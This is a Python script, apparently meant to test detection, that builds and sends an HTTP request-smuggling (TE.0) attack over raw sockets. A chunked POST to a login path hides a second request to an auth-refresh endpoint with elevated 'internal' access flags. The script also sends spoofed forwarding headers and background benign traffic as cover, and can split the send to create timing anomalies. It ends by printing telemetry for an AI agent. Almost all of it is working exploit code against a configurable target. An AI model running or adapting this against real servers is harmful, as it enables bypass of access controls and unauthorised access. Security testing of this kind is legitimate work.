
"""
Phase 1 - HTTP Desync Simulator (Raw Socket, final)
- Dùng sendall() thay send()
- Randomize Content-Length conflict
- Partial send + shutdown (optional)
- Không in MITRE mapping cứng, chỉ in telemetry
- Benign traffic chạy riêng (dùng threading đơn giản)
"""

import socket
import time
import uuid
import random
import json
import sys
import threading
# ========== CẤU HÌNH ==========
TARGET_HOST = "100.126.121.94"
TARGET_PORT = 8080
USE_PARTIAL_SEND = False            # Bật để mô phỏng gửi từng phần
PARTIAL_SLEEP = 0.5
USE_SHUTDOWN = False                # Optional: shutdown sau partial send

CORRELATION_ID = str(uuid.uuid4())
TARGET_PATH = "/auth/login"
SMUGGLED_PATH = "/api/v1/auth/refresh"

PAYLOAD = {
    "feature_flag": True,
    "debug_mode": True,
    "access_level": "internal"
}
PAYLOAD_JSON = json.dumps(PAYLOAD)

def send_benign_requests(count=8):
    """Gửi benign traffic trong thread riêng"""
    def _send():
        for i in range(count):
            benign_id = f"benign-{uuid.uuid4()}"
            req = (
                f"GET {TARGET_PATH} HTTP/1.1\r\n"
                f"Host: {TARGET_HOST}\r\n"
                f"X-Request-ID: {benign_id}\r\n"
                "User-Agent: Mozilla/5.0\r\n"
                "\r\n"
            ).encode()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                sock.connect((TARGET_HOST, TARGET_PORT))
                sock.sendall(req)
                sock.close()
            except:
                pass
            time.sleep(random.uniform(0.1, 0.3))
    thread = threading.Thread(target=_send)
    thread.daemon = True
    thread.start()
    return thread

def build_smuggling_request():
    """TE.0 smuggling probe — TE:chunked without Content-Length targeting uvicorn directly"""
    # Inner smuggled request appended after chunked terminator
    smuggled_req = (
        f"POST {SMUGGLED_PATH} HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        "Content-Type: application/json\r\n"
        f"Content-Length: {len(PAYLOAD_JSON)}\r\n"
        f"X-Request-ID: {CORRELATION_ID}\r\n"
        "X-Internal-Trace: true\r\n"
        "\r\n"
        f"{PAYLOAD_JSON}"
    )

    # Valid chunked body: one chunk + terminator + trailing smuggled data
    chunk_size = f"{len(PAYLOAD_JSON):x}"
    body = (
        f"{chunk_size}\r\n"
        f"{PAYLOAD_JSON}\r\n"
        f"0\r\n"
        f"\r\n"
        + smuggled_req
    )

    # Outer request: TE:chunked only — no Content-Length avoids h11 CL+TE rejection
    headers = (
        f"POST {TARGET_PATH} HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Content-Type: application/json\r\n"
        f"X-Request-ID: {CORRELATION_ID}\r\n"
        f"X-Forwarded-For: 45.33.32.156\r\n"
        f"X-Internal-Trace: true\r\n"
        f"X-Forwarded-Host: internal-admin\r\n"
        f"User-Agent: Mozilla/5.0\r\n"
        "\r\n"
    )
    full_request = headers + body
    return full_request.encode('utf-8')

def send_raw_request(data):
    """Gửi raw request qua socket, dùng sendall, hỗ trợ partial send + shutdown"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    try:
        sock.connect((TARGET_HOST, TARGET_PORT))
        if USE_PARTIAL_SEND:
            split = len(data) // 2
            sock.sendall(data[:split])
            time.sleep(PARTIAL_SLEEP)
            sock.sendall(data[split:])
            if USE_SHUTDOWN:
                sock.shutdown(socket.SHUT_WR)
        else:
            sock.sendall(data)
        
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        return response.decode(errors='ignore')
    except Exception as e:
        print(f"[-] Socket error: {e}")
        return None
    finally:
        sock.close()

def main():
    global TARGET_HOST, TARGET_PORT
    if len(sys.argv) > 1:
        TARGET_HOST = sys.argv[1]
    if len(sys.argv) > 2:
        TARGET_PORT = int(sys.argv[2])
    
    print(f"[*] Target: {TARGET_HOST}:{TARGET_PORT}")
    print(f"[*] Correlation ID: {CORRELATION_ID}")
    
    # Start benign traffic in background
    benign_thread = send_benign_requests(5)
    
    # Gửi smuggling request
    raw_data = build_smuggling_request()
    print(f"[*] Request size: {len(raw_data)} bytes")
    print(f"[*] TE:chunked probe — no Content-Length (TE.0 variant)")
    response = send_raw_request(raw_data)
    if response:
        print("[+] Response preview:", response[:300])
    else:
        print("[-] No response - fallback triggered")
    
    # Chờ benign thread kết thúc
    benign_thread.join(timeout=2)
    
    # Telemetry cho AI (không hardcode MITRE)
    print("\n=== TELEMETRY FOR AI AGENT ===")
    print(f"Correlation ID       : {CORRELATION_ID}")
    print(f"Frontend endpoint    : {TARGET_PATH}")
    print(f"Suspected backend access: {SMUGGLED_PATH}")
    print("Observed anomalies:")
    print("  - Transfer-Encoding: chunked without Content-Length (TE.0)")
    print("  - X-Internal-Trace header injected from external client")
    print("  - X-Forwarded-Host: internal-admin (header injection attempt)")
    if USE_PARTIAL_SEND:
        print("  - Partial request with delay (timing anomaly)")
    print("AI Agent should reason about possible Defense Evasion / Initial Access techniques.")
    print("(Do not hardcode T1562.001/T1190 - let AI map autonomously)")

if __name__ == "__main__":
    main()